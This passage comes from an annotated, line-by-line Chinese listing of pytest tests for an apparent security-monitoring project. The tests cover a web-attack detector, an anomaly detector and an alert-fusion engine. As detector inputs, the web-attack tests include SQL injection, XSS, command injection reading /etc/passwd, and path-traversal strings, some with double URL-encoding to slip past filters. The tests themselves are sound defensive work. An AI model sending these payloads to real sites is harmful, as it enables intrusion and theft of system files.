| 146 | 断言：验证测试或运行时假设是否成立。 | `        assert result.source_ip == self._SRC` |
| 147 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 148 | 函数定义：声明 `test_sql_union_select_detected` 的输入、处理逻辑和返回结果。 | `    def test_sql_union_select_detected(self, detector):` |
| 149 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result = detector.detect(` |
| 150 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._feat(` |
| 151 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                url_raw="/api?id=1 UNION SELECT username,password FROM users"` |
| 152 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 153 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 154 | 断言：验证测试或运行时假设是否成立。 | `        assert result.threat_type == "web_attack"` |
| 155 | 断言：验证测试或运行时假设是否成立。 | `        assert "sql_injection" in result.details` |
| 156 | 断言：验证测试或运行时假设是否成立。 | `        assert result.source_ip == self._SRC` |
| 157 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 158 | 函数定义：声明 `test_xss_detected` 的输入、处理逻辑和返回结果。 | `    def test_xss_detected(self, detector):` |
| 159 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result = detector.detect(` |
| 160 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._feat(url_raw="/s?q=<script>alert(1)</script>")` |
| 161 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 162 | 断言：验证测试或运行时假设是否成立。 | `        assert result.threat_type == "web_attack"` |
| 163 | 断言：验证测试或运行时假设是否成立。 | `        assert "xss" in result.details` |
| 164 | 断言：验证测试或运行时假设是否成立。 | `        assert result.source_ip == self._SRC` |
| 165 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 166 | 函数定义：声明 `test_xss_event_handler_detected` 的输入、处理逻辑和返回结果。 | `    def test_xss_event_handler_detected(self, detector):` |
| 167 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result = detector.detect(` |
| 168 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._feat(url_raw='/a?v=<img src=x onerror=alert(1)>')` |
| 169 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 170 | 断言：验证测试或运行时假设是否成立。 | `        assert result.threat_type == "web_attack"` |
| 171 | 断言：验证测试或运行时假设是否成立。 | `        assert "xss" in result.details` |
| 172 | 断言：验证测试或运行时假设是否成立。 | `        assert result.source_ip == self._SRC` |
| 173 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 174 | 函数定义：声明 `test_command_injection_detected` 的输入、处理逻辑和返回结果。 | `    def test_command_injection_detected(self, detector):` |
| 175 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result = detector.detect(` |
| 176 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._feat(url_raw="/run?cmd=;cat /etc/passwd")` |
| 177 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 178 | 断言：验证测试或运行时假设是否成立。 | `        assert result.threat_type == "web_attack"` |
| 179 | 断言：验证测试或运行时假设是否成立。 | `        assert "command_injection" in result.details` |
| 180 | 断言：验证测试或运行时假设是否成立。 | `        assert result.source_ip == self._SRC` |
| 181 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 182 | 函数定义：声明 `test_path_traversal_detected` 的输入、处理逻辑和返回结果。 | `    def test_path_traversal_detected(self, detector):` |
| 183 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result = detector.detect(` |
| 184 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._feat(url_raw="/file?name=../../../etc/passwd")` |
| 185 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 186 | 断言：验证测试或运行时假设是否成立。 | `        assert result.threat_type == "web_attack"` |
| 187 | 断言：验证测试或运行时假设是否成立。 | `        assert "path_traversal" in result.details` |
| 188 | 断言：验证测试或运行时假设是否成立。 | `        assert result.source_ip == self._SRC` |
| 189 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 190 | 注释：解释下面或当前这段代码的设计意图。 | `    # ---- 多层 URL 解码防绕过 ----` |
| 191 | 函数定义：声明 `test_single_encoded_xss_bypass` 的输入、处理逻辑和返回结果。 | `    def test_single_encoded_xss_bypass(self, detector):` |
| 192 | 注释：解释下面或当前这段代码的设计意图。 | `        # %3Cscript%3Ealert(1)%3C/script%3E -> <script>alert(1)</script>` |
| 193 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result = detector.detect(` |
| 194 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._feat(url_raw="/x?q=%3Cscript%3Ealert(1)%3C/script%3E")` |
| 195 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 196 | 断言：验证测试或运行时假设是否成立。 | `        assert result.threat_type == "web_attack"` |
| 197 | 断言：验证测试或运行时假设是否成立。 | `        assert "xss" in result.details` |
| 198 | 断言：验证测试或运行时假设是否成立。 | `        assert result.source_ip == self._SRC` |
| 199 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 200 | 函数定义：声明 `test_double_encoded_xss_bypass` 的输入、处理逻辑和返回结果。 | `    def test_double_encoded_xss_bypass(self, detector):` |
| 201 | 注释：解释下面或当前这段代码的设计意图。 | `        # %253Cscript%253E -> %3Cscript%3E -> <script>` |
| 202 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result = detector.detect(` |
| 203 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._feat(url_raw="/x?q=%253Cscript%253Ealert(1)%253C/script%253E")` |
| 204 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 205 | 断言：验证测试或运行时假设是否成立。 | `        assert result.threat_type == "web_attack"` |
| 206 | 断言：验证测试或运行时假设是否成立。 | `        assert "xss" in result.details` |
| 207 | 断言：验证测试或运行时假设是否成立。 | `        assert result.source_ip == self._SRC` |
| 208 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 209 | 函数定义：声明 `test_double_encoded_path_traversal` 的输入、处理逻辑和返回结果。 | `    def test_double_encoded_path_traversal(self, detector):` |
| 210 | 注释：解释下面或当前这段代码的设计意图。 | `        # %252e%252e%2f -> %2e%2e%2f -> ../` |
| 211 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result = detector.detect(` |
| 212 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._feat(url_raw="/f?p=%252e%252e%252fetc%252fpasswd")` |
| 213 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 214 | 断言：验证测试或运行时假设是否成立。 | `        assert result.threat_type == "web_attack"` |
| 215 | 断言：验证测试或运行时假设是否成立。 | `        assert "path_traversal" in result.details` |
| 216 | 断言：验证测试或运行时假设是否成立。 | `        assert result.source_ip == self._SRC` |
| 217 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 218 | 函数定义：声明 `test_source_ip_from_web_request_v1` 的输入、处理逻辑和返回结果。 | `    def test_source_ip_from_web_request_v1(self, detector):` |
| 219 | 文档字符串：说明当前模块、类或函数的职责。 | `        """仅提供 web_request_v1.src_ip 时也应进入 DetectionResult。"""` |
| 220 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result = detector.detect(` |
| 221 | 代码语句：参与当前文件的业务流程或数据处理。 | `            {` |
| 222 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "url_raw": "/x?q=1' OR 1=1--",` |
| 223 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "web_request_v1": {"src_ip": "198.51.100.88", "schema": "web_request_v1"},` |
| 224 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 225 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 226 | 断言：验证测试或运行时假设是否成立。 | `        assert result.threat_level == "high"` |
| 227 | 断言：验证测试或运行时假设是否成立。 | `        assert result.source_ip == "198.51.100.88"` |
| 228 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 229 | 函数定义：声明 `test_decode_url_stops_when_stable` 的输入、处理逻辑和返回结果。 | `    def test_decode_url_stops_when_stable(self):` |
| 230 | 文档字符串：说明当前模块、类或函数的职责。 | `        """_decode_url 必须在解码结果稳定时停止，不能无限循环。"""` |
| 231 | 断言：验证测试或运行时假设是否成立。 | `        assert WebAttackDetector._decode_url("hello") == "hello"` |
| 232 | 断言：验证测试或运行时假设是否成立。 | `        assert WebAttackDetector._decode_url("a%20b") == "a b"` |
| 233 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 234 | 函数定义：声明 `test_decode_url_handles_non_string` 的输入、处理逻辑和返回结果。 | `    def test_decode_url_handles_non_string(self):` |
| 235 | 断言：验证测试或运行时假设是否成立。 | `        assert WebAttackDetector._decode_url(None) == ""  # type: ignore[arg-type]` |
| 236 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 237 | 注释：解释下面或当前这段代码的设计意图。 | `    # ---- 正常请求不误报 ----` |
| 238 | 函数定义：声明 `test_normal_url_no_false_positive` 的输入、处理逻辑和返回结果。 | `    def test_normal_url_no_false_positive(self, detector):` |
| 239 | 循环：逐个处理集合或迭代器中的元素。 | `        for url in [` |
| 240 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "/api/users?page=1&limit=10",` |
| 241 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "/index.html",` |
| 242 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "/static/css/style.css",` |
| 243 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "/api/products/search?q=laptop",` |
| 244 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "/favicon.ico",` |
| 245 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ]:` |
| 246 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            result = detector.detect(self._feat(url_raw=url))` |
| 247 | 断言：验证测试或运行时假设是否成立。 | `            assert result.threat_type == "normal", f"误报: {url}"` |
| 248 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 249 | 函数定义：声明 `test_missing_url_returns_normal` 的输入、处理逻辑和返回结果。 | `    def test_missing_url_returns_normal(self, detector):` |
| 250 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result = detector.detect({})` |
| 251 | 断言：验证测试或运行时假设是否成立。 | `        assert result.threat_type == "normal"` |
| 252 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 253 | 函数定义：声明 `test_is_instance_of_base` 的输入、处理逻辑和返回结果。 | `    def test_is_instance_of_base(self, detector):` |
| 254 | 断言：验证测试或运行时假设是否成立。 | `        assert isinstance(detector, BaseDetector)` |
| 255 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 256 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 257 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 258 | 注释：解释下面或当前这段代码的设计意图。 | `# 5. AnomalyDetector` |
| 259 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 260 | 类定义：声明 `TestAnomalyDetector`，封装相关状态与行为。 | `class TestAnomalyDetector:` |
| 261 | 函数定义：声明 `test_default_not_ready` 的输入、处理逻辑和返回结果。 | `    def test_default_not_ready(self):` |
| 262 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        detector = AnomalyDetector()` |
| 263 | 断言：验证测试或运行时假设是否成立。 | `        assert detector.is_ready is False` |
| 264 | 断言：验证测试或运行时假设是否成立。 | `        assert detector.detect({"pkt_len_mean": 100}) is None` |
| 265 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 266 | 函数定义：声明 `test_manual_if_only_detects_anomaly` 的输入、处理逻辑和返回结果。 | `    def test_manual_if_only_detects_anomaly(self):` |
| 267 | 文档字符串：说明当前模块、类或函数的职责。 | `        """模拟 Isolation Forest 加载成功，Autoencoder 未加载的场景。"""` |
| 268 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        detector = AnomalyDetector()` |
| 269 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 270 | 类定义：声明 `_FakeIF`，封装相关状态与行为。 | `        class _FakeIF:` |
| 271 | 函数定义：声明 `predict` 的输入、处理逻辑和返回结果。 | `            def predict(self, X):` |
| 272 | 返回结果：把处理后的值交回调用方。 | `                return [-1]  # 强制异常` |
| 273 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 274 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        detector.if_model = _FakeIF()` |
| 275 | 断言：验证测试或运行时假设是否成立。 | `        assert detector.is_ready is True` |
| 276 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 277 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result = detector.detect({"pkt_len_mean": 500, "src_ip": "1.2.3.4"})` |
| 278 | 断言：验证测试或运行时假设是否成立。 | `        assert result is not None` |
| 279 | 断言：验证测试或运行时假设是否成立。 | `        assert result.threat_type == "anomaly"` |
| 280 | 断言：验证测试或运行时假设是否成立。 | `        assert result.threat_level == "medium"  # 单模型命中 score=0.5` |
| 281 | 断言：验证测试或运行时假设是否成立。 | `        assert result.source_ip == "1.2.3.4"` |
| 282 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 283 | 函数定义：声明 `test_both_models_hit_yields_high_level` 的输入、处理逻辑和返回结果。 | `    def test_both_models_hit_yields_high_level(self):` |
| 284 | 文档字符串：说明当前模块、类或函数的职责。 | `        """双模型同时命中时异常分数=1.0，等级升为 high。"""` |
| 285 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        detector = AnomalyDetector()` |
| 286 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 287 | 类定义：声明 `_FakeIF`，封装相关状态与行为。 | `        class _FakeIF:` |
| 288 | 函数定义：声明 `predict` 的输入、处理逻辑和返回结果。 | `            def predict(self, X):` |
| 289 | 返回结果：把处理后的值交回调用方。 | `                return [-1]` |
| 290 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 291 | 类定义：声明 `_FakeScaler`，封装相关状态与行为。 | `        class _FakeScaler:` |
| 292 | 函数定义：声明 `transform` 的输入、处理逻辑和返回结果。 | `            def transform(self, X):` |
| 293 | 返回结果：把处理后的值交回调用方。 | `                return X` |
| 294 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 295 | 类定义：声明 `_FakeAE`，封装相关状态与行为。 | `        class _FakeAE:` |
| 296 | 函数定义：声明 `predict` 的输入、处理逻辑和返回结果。 | `            def predict(self, X, verbose=0):  # noqa: ARG002` |
| 297 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `                import numpy as np` |
| 298 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 299 | 返回结果：把处理后的值交回调用方。 | `                return np.zeros_like(X)  # 全 0 重建，mse 很大` |
| 300 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 301 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        detector.if_model = _FakeIF()` |
| 302 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        detector.ae_model = _FakeAE()` |
| 303 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        detector.ae_scaler = _FakeScaler()` |
| 304 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        detector.ae_threshold = 0.001` |
| 305 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 306 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result = detector.detect(` |
| 307 | 代码语句：参与当前文件的业务流程或数据处理。 | `            {` |
| 308 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "pkt_len_mean": 50,` |
| 309 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "flow_byte_count": 1000,` |
| 310 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "flow_pkt_count": 100,` |
| 311 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "window_unique_dst_port": 10,` |
| 312 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "syn_count": 20,` |
| 313 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 314 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 315 | 断言：验证测试或运行时假设是否成立。 | `        assert result.threat_type == "anomaly"` |
| 316 | 断言：验证测试或运行时假设是否成立。 | `        assert result.threat_level == "high"` |
| 317 | 断言：验证测试或运行时假设是否成立。 | `        assert result.confidence == pytest.approx(1.0)` |
| 318 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 319 | 函数定义：声明 `test_normal_when_no_model_hits` 的输入、处理逻辑和返回结果。 | `    def test_normal_when_no_model_hits(self):` |
| 320 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        detector = AnomalyDetector()` |
| 321 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 322 | 类定义：声明 `_FakeIF`，封装相关状态与行为。 | `        class _FakeIF:` |
| 323 | 函数定义：声明 `predict` 的输入、处理逻辑和返回结果。 | `            def predict(self, X):` |
| 324 | 返回结果：把处理后的值交回调用方。 | `                return [1]  # 正常` |
| 325 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 326 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        detector.if_model = _FakeIF()` |
| 327 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result = detector.detect({"pkt_len_mean": 60})` |
| 328 | 断言：验证测试或运行时假设是否成立。 | `        assert result.threat_type == "normal"` |
| 329 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 330 | 函数定义：声明 `test_is_instance_of_base` 的输入、处理逻辑和返回结果。 | `    def test_is_instance_of_base(self):` |
| 331 | 断言：验证测试或运行时假设是否成立。 | `        assert isinstance(AnomalyDetector(), BaseDetector)` |
| 332 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 333 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 334 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 335 | 注释：解释下面或当前这段代码的设计意图。 | `# 6. FusionEngine` |
| 336 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 337 | 类定义：声明 `TestFusionEngine`，封装相关状态与行为。 | `class TestFusionEngine:` |
| 338 | 装饰器：为下面的函数或类附加框架行为。 | `    @pytest.fixture()` |
| 339 | 函数定义：声明 `engine` 的输入、处理逻辑和返回结果。 | `    def engine(self):` |
| 340 | 返回结果：把处理后的值交回调用方。 | `        return FusionEngine()` |
| 341 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 342 | 函数定义：声明 `test_all_normal_returns_normal` 的输入、处理逻辑和返回结果。 | `    def test_all_normal_returns_normal(self, engine):` |
| 343 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        results = [` |
| 344 | 函数调用：执行已有函数/方法完成当前步骤。 | `            DetectionResult("normal", "low", 1.0, "ok"),` |
| 345 | 函数调用：执行已有函数/方法完成当前步骤。 | `            DetectionResult("normal", "low", 1.0, "ok"),` |
| 346 | 代码语句：参与当前文件的业务流程或数据处理。 | `            None,` |
| 347 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ]` |
| 348 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        fused = engine.fuse(results)` |
| 349 | 断言：验证测试或运行时假设是否成立。 | `        assert fused.threat_type == "normal"` |
| 350 | 断言：验证测试或运行时假设是否成立。 | `        assert fused.threat_level == "low"` |
| 351 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 352 | 函数定义：声明 `test_single_engine_alert_no_upgrade` 的输入、处理逻辑和返回结果。 | `    def test_single_engine_alert_no_upgrade(self, engine):` |
| 353 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        results = [` |
| 354 | 函数调用：执行已有函数/方法完成当前步骤。 | `            DetectionResult("ddos", "medium", 0.7, "ddos", source_ip="10.0.0.1"),` |
| 355 | 函数调用：执行已有函数/方法完成当前步骤。 | `            DetectionResult("normal", "low", 1.0, "ok"),` |
| 356 | 代码语句：参与当前文件的业务流程或数据处理。 | `            None,` |
| 357 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ]` |
| 358 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        fused = engine.fuse(results)` |
| 359 | 断言：验证测试或运行时假设是否成立。 | `        assert fused.threat_type == "ddos"` |
| 360 | 断言：验证测试或运行时假设是否成立。 | `        assert fused.threat_level == "medium"  # 单引擎不升级` |
| 361 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 362 | 函数定义：声明 `test_two_engines_alert_upgrade_to_critical` 的输入、处理逻辑和返回结果。 | `    def test_two_engines_alert_upgrade_to_critical(self, engine):` |
| 363 | 文档字符串：说明当前模块、类或函数的职责。 | `        """两个引擎同时命中 high，应升级为 critical。"""` |
| 364 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        results = [` |
| 365 | 函数调用：执行已有函数/方法完成当前步骤。 | `            DetectionResult("ddos", "high", 0.9, "ddos"),` |
| 366 | 函数调用：执行已有函数/方法完成当前步骤。 | `            DetectionResult("anomaly", "high", 0.85, "anomaly"),` |
| 367 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ]` |
| 368 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        fused = engine.fuse(results)` |
| 369 | 断言：验证测试或运行时假设是否成立。 | `        assert fused.threat_level == "critical"` |
| 370 | 断言：验证测试或运行时假设是否成立。 | `        assert "ddos" in fused.threat_type` |
| 371 | 断言：验证测试或运行时假设是否成立。 | `        assert "anomaly" in fused.threat_type` |
| 372 | 断言：验证测试或运行时假设是否成立。 | `        assert fused.raw_data["upgraded"] is True` |
| 373 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 374 | 函数定义：声明 `test_two_engines_alert_low_upgrade_to_medium` 的输入、处理逻辑和返回结果。 | `    def test_two_engines_alert_low_upgrade_to_medium(self, engine):` |
| 375 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        results = [` |
| 376 | 函数调用：执行已有函数/方法完成当前步骤。 | `            DetectionResult("web_attack", "low", 0.3, "web low"),` |
| 377 | 函数调用：执行已有函数/方法完成当前步骤。 | `            DetectionResult("anomaly", "low", 0.4, "anomaly low"),` |
| 378 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ]` |
| 379 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        fused = engine.fuse(results)` |
| 380 | 断言：验证测试或运行时假设是否成立。 | `        assert fused.threat_level == "medium"` |
| 381 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 382 | 函数定义：声明 `test_mixed_levels_picks_highest` 的输入、处理逻辑和返回结果。 | `    def test_mixed_levels_picks_highest(self, engine):` |
| 383 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        results = [` |
| 384 | 函数调用：执行已有函数/方法完成当前步骤。 | `            DetectionResult("ddos", "medium", 0.7, "ddos medium"),` |
| 385 | 函数调用：执行已有函数/方法完成当前步骤。 | `            DetectionResult("intrusion", "high", 0.9, "intrusion high"),` |
| 386 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ]` |
| 387 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        fused = engine.fuse(results)` |
| 388 | 注释：解释下面或当前这段代码的设计意图。 | `        # 最高等级为 high，两个引擎联动升级 -> critical` |
| 389 | 断言：验证测试或运行时假设是否成立。 | `        assert fused.threat_level == "critical"` |
| 390 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 391 | 函数定义：声明 `test_weighted_confidence_in_range` 的输入、处理逻辑和返回结果。 | `    def test_weighted_confidence_in_range(self, engine):` |
| 392 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        results = [` |
| 393 | 函数调用：执行已有函数/方法完成当前步骤。 | `            DetectionResult("ddos", "high", 0.8, "ddos"),` |
| 394 | 函数调用：执行已有函数/方法完成当前步骤。 | `            DetectionResult("anomaly", "medium", 0.6, "anomaly"),` |
| 395 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ]` |
| 396 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        fused = engine.fuse(results)` |
| 397 | 断言：验证测试或运行时假设是否成立。 | `        assert 0.0 <= fused.confidence <= 1.0` |
| 398 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 399 | 函数定义：声明 `test_none_results_ignored` 的输入、处理逻辑和返回结果。 | `    def test_none_results_ignored(self, engine):` |
| 400 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        fused = engine.fuse([None, None, None])` |
| 401 | 断言：验证测试或运行时假设是否成立。 | `        assert fused.threat_type == "normal"` |
| 402 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 403 | 函数定义：声明 `test_source_ip_propagated` 的输入、处理逻辑和返回结果。 | `    def test_source_ip_propagated(self, engine):` |
| 404 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        results = [` |
| 405 | 函数调用：执行已有函数/方法完成当前步骤。 | `            DetectionResult("ddos", "high", 0.9, "ddos", source_ip="192.168.1.100"),` |
| 406 | 函数调用：执行已有函数/方法完成当前步骤。 | `            DetectionResult("anomaly", "medium", 0.6, "anomaly"),` |
| 407 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ]` |
| 408 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        fused = engine.fuse(results)` |
| 409 | 断言：验证测试或运行时假设是否成立。 | `        assert fused.source_ip == "192.168.1.100"` |
| 410 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 411 | 函数定义：声明 `test_sub_results_include_source_ip` 的输入、处理逻辑和返回结果。 | `    def test_sub_results_include_source_ip(self, engine):` |
| 412 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        results = [` |
| 413 | 函数调用：执行已有函数/方法完成当前步骤。 | `            DetectionResult("web_attack", "high", 0.95, "w", source_ip="10.0.0.5"),` |
| 414 | 函数调用：执行已有函数/方法完成当前步骤。 | `            DetectionResult("intrusion", "medium", 0.7, "i", source_ip=""),` |
| 415 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ]` |
| 416 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        fused = engine.fuse(results)` |
| 417 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        subs = fused.raw_data.get("sub_results") or []` |
| 418 | 断言：验证测试或运行时假设是否成立。 | `        assert len(subs) == 2` |
| 419 | 断言：验证测试或运行时假设是否成立。 | `        assert subs[0]["source_ip"] == "10.0.0.5"` |
| 420 | 断言：验证测试或运行时假设是否成立。 | `        assert subs[1]["source_ip"] == ""` |
| 421 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 422 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 423 | 条件判断：满足条件时进入对应分支。 | `if __name__ == "__main__":` |
| 424 | 函数调用：执行已有函数/方法完成当前步骤。 | `    pytest.main([__file__, "-v"])` |

## `tests/test_features.py`

- 类型：测试
- 行数：391

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 2 | 代码语句：参与当前文件的业务流程或数据处理。 | `Phase 2 特征工程层 - 验证脚本` |
| 3 | 代码语句：参与当前文件的业务流程或数据处理。 | `对应架构文档 §4 / Phase 2 提示词验收标准` |
| 4 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 5 | 代码语句：参与当前文件的业务流程或数据处理。 | `运行方式:` |
| 6 | 代码语句：参与当前文件的业务流程或数据处理。 | `    cd ai-security-guardian` |
| 7 | 代码语句：参与当前文件的业务流程或数据处理。 | `    python -m pytest tests/test_features.py -v` |
| 8 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 9 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 10 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 11 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import os` |
| 12 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import sys` |
| 13 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import tempfile` |
| 14 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 15 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import numpy as np` |
| 16 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import pytest` |
| 17 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 18 | 注释：解释下面或当前这段代码的设计意图。 | `# 确保 src 能被导入` |
